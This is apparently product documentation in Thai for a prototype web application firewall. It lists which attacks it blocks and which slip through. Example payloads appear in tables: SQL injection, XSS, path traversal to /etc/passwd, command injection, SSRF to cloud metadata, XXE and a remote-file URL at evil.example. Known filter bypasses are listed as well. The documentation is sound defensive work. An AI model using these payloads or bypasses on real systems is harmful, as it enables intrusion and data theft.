# ระบบปัจจุบันป้องกันการโจมตีแบบไหนได้บ้าง

> สถานะ: เวอร์ชัน v0.9 (ต้นแบบ) — เป็นการป้องกันด้วย **ลายเซ็น + การ normalize + คะแนนความผิดปกติ + ตรวจข้อมูลขาออก** ไม่ใช่ WAF เต็มรูปแบบ และยังไม่ผ่านการทดสอบเจาะระบบโดยผู้เชี่ยวชาญอิสระ
> เนื้อหาทั้งหมดในหน้านี้ตรงกับหน้า **"ระบบป้องกันอะไรได้บ้าง"** ในแอป และทุกตัวอย่างถูกรันซ้ำกับ Gateway จริงโดยชุดเทสต์ (`CatalogVerificationTests`, `EngineUpgradeTests`) เมื่อพฤติกรรมของระบบเปลี่ยน เทสต์จะล้มจนกว่าจะแก้ข้อความนี้ให้ตรง

## มีอะไรใหม่ใน v0.9 (ต่อยอดจาก v0.7.1)
1. **Normalize Unicode ลึก (NFKC)** — รวมอักษร fullwidth/compatibility (เช่น `＜ｓｃｒｉｐｔ＞`) ให้เป็น ASCII และตัดอักขระล่องหน (zero-width, BOM) ที่แทรกเพื่อฉีกคำ (เช่น `un‌ion`) ก่อนจับกับกฎ — เพิ่มจากเดิมที่ถอดรหัส `%xx`, `+`→ช่องว่าง, HTML entity, ลบคอมเมนต์ `/**/`
2. **ลายเซ็นใหม่: NoSQL, XXE, Template Injection (SSTI)** — ตรวจ operator ของ NoSQL (`$ne`,`$gt`,`$where`…), XML External Entity / DOCTYPE และนิพจน์ของ template engine (`{{7*7}}`,`${…}`,`<%…%>`,`#{…}`)
3. **Anomaly scoring (ให้คะแนนความผิดปกติ)** — เมื่อสัญญาณอ่อนหลายอย่างรวมกันในค่าเดียวจนถึงเกณฑ์ จะบล็อกแม้ไม่มีลายเซ็นตัวใดตรงเดี่ยวๆ **ปิดไว้โดยปริยาย** (เปิดได้ที่กฎ `anomaly-01`) เพราะเพิ่ม false positive
4. **ตรวจข้อมูลขาออก (response)** — สแกนคำตอบจากเซิร์ฟเวอร์ปลายทาง หากหลุดเนื้อไฟล์ `passwd`/`shadow`, private key, ข้อความ error ของฐานข้อมูล หรือ stack trace จะระงับและตอบ 502 แทน

> ความสมดุล: ตั้งค่าเน้น "ป้องกันสูงสุด" จึงมีโอกาส **บล็อกผิดพลาด (false positive)** มากขึ้น เช่น ข้อความปกติที่มีคำว่า `sleep(` ทุกกฎเปิด/ปิดแยกได้ที่เมนู *กฎการป้องกัน* และ IP ที่ *อนุญาต* ข้ามการตรวจได้

## ป้องกันได้บางส่วน

### SQL Injection (แทรกคำสั่งฐานข้อมูล)
**ตรวจ:** UNION SELECT, เงื่อนไขบูลีน (OR 1=1), time-based (sleep/benchmark/waitfor), stacked query (;DROP) และการอ่าน metadata — โดยถอดรหัส `%xx` (รวมเข้ารหัสซ้ำ), แปลง `+` เป็นช่องว่าง และลบคอมเมนต์ `/**/` ก่อนตรวจ
**หลุด / บล็อกผิด:** versioned comment ของ MySQL (`/*!50000union*/`) ที่ถูกลบทั้งก้อน, การเข้ารหัสเฉพาะฐานข้อมูล; และคำปกติที่บังเอิญตรงรูปแบบ (เช่น `sleep(` ในข้อความทั่วไป) อาจถูกบล็อกผิดพลาด

| ตัวอย่าง | ผล |
|---|---|
| `sleep(5)` ใน URL | ถูกบล็อก |
| `?q=1%20union%20select%201` (เบราว์เซอร์เข้ารหัส %20) | ถูกบล็อก |
| `?q=1%20or%201=1` | ถูกบล็อก |
| `1/**/union/**/select/**/1` (คอมเมนต์คั่น) | ถูกบล็อก |
| `'; DROP TABLE users;--` (เข้ารหัส) | ถูกบล็อก |
| `union select` ใน JSON และ `1+union+select+1` ในฟอร์ม | ถูกบล็อก |
| `sleep(8)` ในข้อความปกติ | ถูกบล็อก (false positive) |
| `/*!50000union*/select 1` (versioned comment) | **หลุด** |

### Cross-Site Scripting (ฝังสคริปต์)
**ตรวจ:** `<script>`, `javascript:`/`vbscript:`, event handler หลายสิบตัว, แท็กอันตราย (`<svg>`,`<img>`,`<iframe>`…) และ sink เช่น `document.cookie` — หลังถอดรหัส `%xx`, HTML entity และ **รวมอักษร Unicode (NFKC)**
**หลุด:** event handler ใหม่ๆ ที่ไม่อยู่ในรายการ และ DOM-based XSS ที่เกิดฝั่งหน้าเว็บเอง

| ตัวอย่าง | ผล |
|---|---|
| `javascript:` ใน URL | ถูกบล็อก |
| `%3Cscript%3E` (เบราว์เซอร์เข้ารหัส) | ถูกบล็อก |
| `%3Csvg%20onload%3D…%3E` | ถูกบล็อก |
| `&lt;script&gt;` (HTML entity) | ถูกบล็อก |
| `＜script＞` (วงเล็บ fullwidth — รวมด้วย NFKC) | ถูกบล็อก |
| `<script>` ใน JSON และฟอร์ม | ถูกบล็อก |
| `<x onbeforetoggle=…>` (handler นอกรายการ) | **หลุด** |

### Path Traversal (ย้อนโฟลเดอร์อ่านไฟล์)
**ตรวจ:** `../` และ `..\` หลังถอดรหัส (รวมเข้ารหัสซ้ำ `%252e` และ UTF-8 overlong) และการอ้างไฟล์ระบบตรงๆ (`/etc/passwd`, `win.ini`, `web.config`, `.ssh/id_rsa`)
**หลุด:** การอ่านไฟล์ผ่านพารามิเตอร์ที่ชื่อไฟล์ดูปกติ (เช่น `file=config/database.yml`)

| ตัวอย่าง | ผล |
|---|---|
| `../../etc/passwd` | ถูกบล็อก |
| `..%2f..%2f` (ถอดรหัสแล้วเป็น `../`) | ถูกบล็อก |
| `%252e%252e%252f` (เข้ารหัสซ้ำ) | ถูกบล็อก |
| `/etc/passwd` ตรงๆ และ `web.config` | ถูกบล็อก |
| `file=config/database.yml` (ชื่อดูปกติ) | **หลุด** |

### LFI / RFI (ดึงไฟล์ในเครื่องหรือภายนอก)
**ตรวจ:** ตัวจัดการสตรีม/สคีมอันตราย: `php://filter`, `file://`, `data://`, `gopher://`, `dict://`
**หลุด:** RFI ผ่าน `http(s)://` (URL ในพารามิเตอร์เป็นเรื่องปกติของหลายเว็บ จึงแยกไม่ได้)

| ตัวอย่าง | ผล |
|---|---|
| `php://filter/...` | ถูกบล็อก |
| `file:///etc/passwd` | ถูกบล็อก |
| `http://evil.example/shell.txt` (RFI) | **หลุด** |

### Command Injection (แทรกคำสั่งระบบ)
**ตรวจ:** ตัวคั่นคำสั่ง (`;` `|` `&` ขึ้นบรรทัดใหม่) ตามด้วยคำสั่งระบบที่พบบ่อย (`cat`,`id`,`whoami`,`curl`,`wget`…) และการแทนค่าคำสั่ง `$(...)`, `${...}`, backtick, `/bin/sh`, `cmd.exe`
**หลุด:** การเรียกสคริปต์/ไบนารีชื่ออื่น (เช่น `;./deploy.sh`)

| ตัวอย่าง | ผล |
|---|---|
| `;id` , `|whoami` | ถูกบล็อก |
| `$(whoami)` | ถูกบล็อก |
| `;./deploy.sh` (ไบนารีชื่ออื่น) | **หลุด** |

### SSRF (ให้เซิร์ฟเวอร์ยิงเป้าภายใน)
**ตรวจ:** ที่อยู่ cloud metadata และปลายทางภายในที่รู้จัก (`169.254.169.254`, `metadata.google.internal`, `100.100.100.200`…)
**หลุด:** โฮสต์ภายในทั่วไป (`192.168.x.x` หรือชื่อโฮสต์ภายในองค์กร)

| ตัวอย่าง | ผล |
|---|---|
| `http://169.254.169.254/latest/meta-data/` | ถูกบล็อก |
| `http://192.168.0.5/admin` | **หลุด** |

### NoSQL Injection (แทรก operator ของ NoSQL)
**ตรวจ:** operator ของ MongoDB/NoSQL เช่น `$ne`, `$gt`, `$where`, `$regex`, `$exists` ทั้งในรูป JSON (`{"$ne":null}`) และรูปแบบ array ใน query (`user[$ne]=1`) หลังถอดรหัส `%xx`
**หลุด:** การฉีดแบบ type juggling (`user[]=admin`) หรือที่ไลบรารีฝั่งเว็บประกอบ operator ขึ้นเองจากโครงสร้างข้อมูล

| ตัวอย่าง | ผล |
|---|---|
| `{"$ne":null}` ใน query (เข้ารหัส) | ถูกบล็อก |
| `user[$ne]=1` (array operator) | ถูกบล็อก |
| `{"user":{"$gt":""}}` ใน JSON | ถูกบล็อก |
| `user[]=admin&pass[]=x` (type juggling) | **หลุด** |

### XXE (XML External Entity)
**ตรวจ:** `<!DOCTYPE … [ … ]>`, `<!ENTITY … SYSTEM …>` และ `SYSTEM`/`PUBLIC` ที่อ้างสคีมอันตราย (`file://`, `http://`) ในเนื้อหา XML (จับด้วยลายเซ็น ไม่ได้ parse XML จริง)
**หลุด:** DOCTYPE ปกติ (`<!DOCTYPE html>`) ไม่ถูกบล็อก และ payload ที่แยกส่วนผิดรูปอาจหลุด

| ตัวอย่าง | ผล |
|---|---|
| `<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>` | ถูกบล็อก |
| `<!DOCTYPE r SYSTEM "http://evil.example/x.dtd">` (external DTD) | ถูกบล็อก |
| `<!DOCTYPE html>` (ประกาศปกติ) | **ผ่าน (ไม่บล็อกทุก DOCTYPE)** |

### Template Injection (SSTI ฝั่งเซิร์ฟเวอร์)
**ตรวจ:** นิพจน์เลขคณิต (`{{7*7}}`, `${7*7}`) และคีย์เวิร์ดอันตรายของ template engine (`config`,`__class__`,`runtime`,`processbuilder`…) ในรูปแบบ `{{…}}`, `${…}`, `<%…%>`, `#{…}`
**หลุด:** การใช้ template ตามปกติ (เช่น `{{user.name}}`) ไม่ถูกบล็อก และไวยากรณ์ของ engine ที่ไม่ครอบคลุม

| ตัวอย่าง | ผล |
|---|---|
| `{{7*7}}` (Jinja/Twig) | ถูกบล็อก |
| `${7*7}` (EL/JSP — ซ้อนกับกฎ Command Injection) | ถูกบล็อก |
| `{{config.items()}}` | ถูกบล็อก |
| `{{user.name}}` (template ปกติ) | **ผ่าน** |

### ตรวจข้อมูลขาออก (Response leak)
**ตรวจ:** คำตอบที่เซิร์ฟเวอร์ปลายทางส่งกลับ — หากหลุดข้อมูลอ่อนไหว (เนื้อไฟล์ `passwd`/`shadow`, private key, ข้อความ error ของฐานข้อมูล เช่น `Npgsql.PostgresException`, stack trace) จะระงับไม่ให้ถึงผู้ใช้และตอบ **502** แทน ปิดได้ด้วย `Waf:InspectResponses=false`
**หลุด:** ตรวจเฉพาะคำตอบที่เป็นข้อความ (html/text/json/xml) และ **ไม่เกิน 256 KB** (`Waf:MaxResponseInspectBytes`); คำตอบที่ใหญ่กว่านี้หรือเป็นไบนารีจะส่งผ่านโดยไม่ตรวจ (fail-open)

| ตัวอย่าง | ผล |
|---|---|
| ปลายทางคืนเนื้อ `root:x:0:0:` (text/plain) | ถูกระงับ (502) |
| ปลายทางคืน `Npgsql.PostgresException: …` (json) | ถูกระงับ (502) |
| ปลายทางคืนหน้า HTML ปกติ | ผ่าน |
| เนื้อ `passwd` แต่ประกาศเป็น `application/octet-stream` | **หลุด (ไบนารีไม่ถูกตรวจ)** |
| คำตอบข้อความ > 256 KB | **หลุด (เกินขนาดที่ตรวจ)** |

> ยืนยันด้วยชุดทดสอบ `EngineUpgradeTests` (เซิร์ฟเวอร์ปลายทางจำลองที่จงใจทำข้อมูลรั่ว) ไม่ใช่ตัวอย่างในหน้า catalog เพราะ fake upstream ของ catalog ตอบคงที่

### การโจมตีผ่าน Header / Cookie / User-Agent
**ตรวจ:** payload ในหัวข้อที่พบบ่อย (User-Agent, Referer, Origin, X-Forwarded-*, Cookie) ด้วยกฎชุดเดียวกับ URL และรู้จักเครื่องมือสแกน (sqlmap, nikto, nuclei…) จาก User-Agent
**หลุด:** payload ในหัวข้อแบบกำหนดเองชื่ออื่นที่ไม่อยู่ในรายการตรวจ

| ตัวอย่าง | ผล |
|---|---|
| User-Agent = `sqlmap/1.7` | ถูกบล็อก |
| `<script>` ใน Cookie | ถูกบล็อก |
| `sleep(5)` ใน X-Forwarded-Host | ถูกบล็อก |
| `<script>` ใน `X-Custom-Data` (หัวข้อนอกรายการ) | **หลุด** |

### ตรวจเนื้อหาคำขอทุกชนิด
**ตรวจ:** เนื้อหาของ JSON, ฟอร์ม, `text/plain`, XML, multipart (อัปโหลดไฟล์) และคำขอแบบ **chunked** ที่ไม่ระบุขนาด (เดิมตรวจแค่ JSON/ฟอร์ม)
**หลุด:** เนื้อหาที่ประกาศเป็นชนิดไบนารี (`application/octet-stream`)

| ตัวอย่าง | ผล |
|---|---|
| `<script>` ใน text/plain, multipart, chunked | ถูกบล็อก |
| ฟอร์ม `q=%3Cscript%3E` (เข้ารหัส) | ถูกบล็อก |
| `<script>` ใน `application/octet-stream` | **หลุด** |

### จำกัดความถี่คำขอ (Rate limit)
**ทำได้:** IP หนึ่งส่งได้ไม่เกิน **300 คำขอต่อนาที** เกินได้ HTTP 429
**ข้อจำกัด:** ตัวเลขตายตัว นับในหน่วยความจำของโปรแกรมนี้ ไม่ใช่การกัน DDoS (หลาย IP หรือส่งช้าๆ ไม่ถูกจำกัด)

## Structured body inspection และ bounded decompression

JSON, form-urlencoded, XML และ multipart body จะถูกแยกเป็น field/key/value ที่มีขีดจำกัดก่อนส่งเข้า rule engine โดยไม่แก้ body ที่ส่งต่อ upstream ระบบรองรับ gzip, deflate และ Brotli เฉพาะเมื่อผ่าน compressed-size, decompressed-size และ expansion-ratio limits; encoding ที่ไม่รู้จัก, XML entity/external DTD และ payload ที่เกิน parser budget จะถูกปฏิเสธแบบ fail-closed ใน Production

การรองรับ parser นี้เพิ่มความแม่นยำเมื่อ payload อยู่ใน object ซ้อน, form field, XML attribute หรือ multipart filename แต่ยังไม่ใช่ OWASP CRS เต็มรูปแบบ และยังต้องทำ external penetration test/load test

## เสริม: Anomaly scoring (ให้คะแนนความผิดปกติ)
ชั้นเสริมที่ให้คะแนนสัญญาณอ่อน (คีย์เวิร์ด SQL, เครื่องหมายคอมเมนต์/คำสั่ง, วงเล็บมุม, ตัวแทนคำสั่ง ฯลฯ) เมื่อรวมกันในค่าเดียว **ถึงเกณฑ์ (ค่าเริ่มต้น 7 คะแนน)** จึงบล็อก ช่วยจับการโจมตีที่พรางจนไม่มีลายเซ็นตัวใดตรงเดี่ยวๆ
**ปิดไว้โดยปริยาย** เพราะเพิ่ม false positive — เปิด/ปิดได้ที่กฎ `anomaly-01` หรือ `Waf:AnomalyScoring:Enabled`, ปรับเกณฑ์ที่ `Waf:AnomalyScoring:Threshold`

## ป้องกันได้

### กฎที่คุณเขียนเอง (Regex)
เพิ่มรูปแบบที่ต้องการบล็อกที่เมนู *กฎการป้องกัน* ตรวจทุกจุดเดียวกับกฎมาตรฐาน (URL, header, cookie, body ทุกชนิด) และได้ประโยชน์จากการถอดรหัส/normalize เช่นกัน ใช้ Regex แบบ NonBacktracking จำกัดเวลา 20 มิลลิวินาที

### บล็อก / อนุญาตตาม IP
บล็อกทุกคำขอจาก IP ที่กำหนด (IPv4/IPv6 ตรงตัว) หรือกำหนด IP ที่เชื่อถือให้ข้ามการตรวจ มีปุ่ม *บล็อก IP นี้* ในหน้าเหตุการณ์
**ข้อควรระวัง:** ไม่รองรับ CIDR; IP ที่ *อนุญาต* ข้ามทุกอย่างรวม rate limit; ระบบเห็นเฉพาะ IP การเชื่อมต่อโดยตรง (หลัง load balancer ทุกคนเป็น IP เดียวกัน)

### ขนาดคำขอที่ผิดปกติ
ปฏิเสธ URL/ข้อความที่ตรวจยาวเกิน 8,192 ตัวอักษร และเนื้อหาคำขอที่ใหญ่เกิน **128 KB** แบบ fail-closed (เดิม 64 KB และเคยบล็อก JSON ปกติที่เกิน 8 KB ผิดพลาด — แก้แล้ว)
**ปรับได้:** ค่า `Waf:MaxBodyInspectBytes` เว็บที่รับไฟล์/ข้อมูลใหญ่กว่านี้ต้องตั้งเพิ่ม

| ตัวอย่าง | ผล |
|---|---|
| JSON ปกติ 9,000 ตัวอักษร | ผ่าน (ไม่บล็อกผิดแล้ว) |
| เนื้อหา > 128 KB | ถูกบล็อก (fail-closed) |

### ป้องกันหน้าจัดการของระบบเอง
รหัสผ่านเก็บแบบ hash (PBKDF2-SHA512), ล็อกบัญชีเมื่อใส่ผิดซ้ำ, ตรวจสิทธิ์ 5 ระดับฝั่งเซิร์ฟเวอร์, ป้องกัน CSRF, เพิกถอนเซสชันได้, รับเฉพาะการเข้าจากเครื่องนี้, บันทึกประวัติการใช้งาน
**ข้อจำกัด:** ไม่บังคับความแข็งแรงของรหัสผ่าน (ตามการตัดสินใจของผู้ดูแล); ยังไม่มี MFA และการจำกัดการลองรหัสต่อ IP

## ยังไม่ป้องกัน

### ด้านอื่นที่ระบบนี้ยังไม่ทำ
XXE แบบ parse จริง (ตรวจด้วยลายเซ็นเท่านั้น), GeoIP / threat intelligence / bot management เต็มรูปแบบ, การถอดรหัส charset ที่ไม่ใช่ UTF-8, WebSocket payload, ไม่ใช่ตัวกัน DDoS, ไม่มี HTTPS ในตัว (ต้องวางหลังตัวที่ทำ TLS)

## ควรทำอย่างไรกับข้อมูลนี้
* ใช้เป็น **ชั้นเสริม** ไม่ใช่ชั้นเดียว — เว็บของคุณต้องใช้ parameterized query, encode ผลลัพธ์ และตรวจ input เอง
* ถ้าเจอ false positive ให้ปิดกฎที่ก่อปัญหาเป็นรายข้อที่เมนู *กฎการป้องกัน* (ทดลองก่อนใน Rule Sandbox)
* อยากตรวจเข้มขึ้นให้เปิด `anomaly-01` แล้วสังเกต false positive ก่อนใช้จริง
* ใช้ปุ่ม **ทดสอบระบบป้องกัน** ในหน้าภาพรวมเพื่อเช็กว่ากฎยังทำงาน
* ขั้นต่อไป (v0.10+): batching/partition ของ event store, SIEM, การศึกษาความเข้ากันได้กับ OWASP CRS — ดู `DEVELOPMENT_ROADMAP.md`
